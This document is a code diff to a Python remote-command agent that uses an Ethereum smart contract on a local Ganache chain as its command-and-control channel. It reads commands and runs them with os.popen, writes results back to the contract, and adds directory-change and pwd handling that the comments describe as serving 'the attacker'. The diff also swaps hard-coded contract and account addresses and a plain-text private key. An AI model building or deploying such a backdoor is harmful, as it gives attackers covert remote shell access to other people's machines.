@@ -12,7 +12,6 @@ import time
 
 # Constants.
 SOLIDITY_VERSION = "0.6.0"
-CONTRACT_ADDR = "0xDa2715596E4Fa50d9D6a64891827C47F01b1C75d"
 CONTRACT_ABI = [
     {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
     {
@@ -92,8 +91,9 @@ CONTRACT_ABI = [
 ]
 GANACHE_SERVICE = "HTTP://127.0.0.1:7545"
 CHAIN_ID = 1337
-ACCOUNT0_ADDR = "0x9F4D94E21B6E7Bd19B06f70CF071388D13677c2C"
-PRIVATE_KEY = "0x39dee5436bfb01ad0dfc372b85306ed85344d965fa967db8e8d16b4ae1a864ab"
+CONTRACT_ADDR = "0x97223459512580e95fC25051e52e064667394Daf"
+ACCOUNT0_ADDR = "0xF3CDd4Dc0aFEBA02741d33092899da869cb196a2"
+PRIVATE_KEY = "0x8d01ec48ed1fb60d5108addceaedf0a4eea0e484674876a0f59189da67180af1"
 
 # Initialize the web3 provider object.
 W3_ENGINE = Web3(Web3.HTTPProvider(GANACHE_SERVICE))
@@ -116,8 +116,21 @@ def main():
         # Set isCommandReady to false.
         SetisCommandReady(0)
 
+        # If the attacker wants to change directory, change.
+        if command.lower().split(" ")[0] == "cd" and len(command.split(" ")) != 1:
+            os.chdir(
+                " ".join(command.split(" ")[1:])
+            )  ### ~~~~~~~~~~~~~ Might not work. didn't test this yet but im tired af.
+
+        # If the attacker wants to know the current working directory.
+        elif command.lower() == "pwd":
+            output = (
+                os.getcwd()
+            )  ### ~~~~~~~~~~~~~ Might not work. didn't test this yet but im tired af.
+
         # Run command.
-        output = os.popen(command).read()
+        else:
+            output = os.popen(command).read()
 
         # Send output.
         SetOutput(output)
